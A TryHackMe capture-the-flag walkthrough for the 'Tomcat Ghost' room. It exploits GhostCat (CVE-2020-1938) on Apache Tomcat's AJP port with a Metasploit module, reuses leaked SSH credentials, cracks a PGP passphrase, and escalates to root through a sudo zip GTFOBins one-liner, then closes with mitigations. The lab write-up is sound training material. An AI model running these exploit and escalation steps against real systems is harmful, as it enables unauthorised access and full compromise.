# Tomcat Ghost – TryHackMe Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 13, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open services and vulnerable components.
- **Nmap Scan:**
nmap -A <target_ip>

text
- **Findings:**
- Port 22: SSH
- Port 53: tcpwrapped
- Port 8009: Apache JServ Protocol (AJP) – vulnerable to GhostCat
- Port 8080: Apache Tomcat 9.0.30 (HTTP)

---

## 2. Exploitation Process

### Step 1 – GhostCat (CVE-2020-1938)
- Used Metasploit module to exploit accessible AJP (8009).
- Extracted `/WEB-INF/web.xml` containing SSH creds:
skyfuck:8730281lkjlkjdqlksalks

text

### Step 2 – SSH Access
- Logged in as `skyfuck`:
ssh skyfuck@<target_ip>

text

### Step 3 – PGP Key Discovery
- Found file `tryhackme.asc` (PGP private key) + `credential.pgp`.
- Cracked PGP key password with `john`:
alexandru

text
- Decrypted `credential.pgp` → got SSH creds for `merlin`.

### Step 4 – SSH as Merlin
- Logged in as merlin with decrypted password.

---

## 3. Proof of Concept (PoC)

- GhostCat exploitation:
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <target_ip>
set RPORT 8009
run

text
- SSH access using embedded creds confirmed vulnerability.
- PGP key crack and decryption yielded second user's SSH access.

---

## 4. Privilege Escalation

- Merlin had `NOPASSWD` sudo rights for `zip`.
- Abused GTFOBins technique:
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

text
- Got root shell.
- Retrieved `/root/root.txt`.

---

## 5. Mitigation Recommendations

- **Patch Tomcat:** Upgrade to 9.0.31+ to fix GhostCat.
- **Disable AJP:** If unused, block via firewall or config.
- **Credential Hygiene:** Remove hardcoded creds from config files.
- **PGP Security:** Use strong passphrases, restrict key file access.
- **Sudo Hardening:** Avoid NOPASSWD for risky binaries like zip.
- **File System Security:** Restrict permissions on sensitive files (keys).

---

## 6. Lessons Learned

- One exposed service (AJP) can lead to complete compromise.
- Weak PGP key passwords can undermine encryption.
- Misconfigured sudo rights remain a common escalation vector.

---

## 7. Skills Practiced

- **Recon:** Nmap service/version detection
- **Exploit Use:** Metasploit module for GhostCat
- **Crypto Attack:** Cracking weak PGP key
- **File Decryption:** GPG key import and decrypt
- **Privilege Escalation:** GTFOBins sudo abuse (zip)
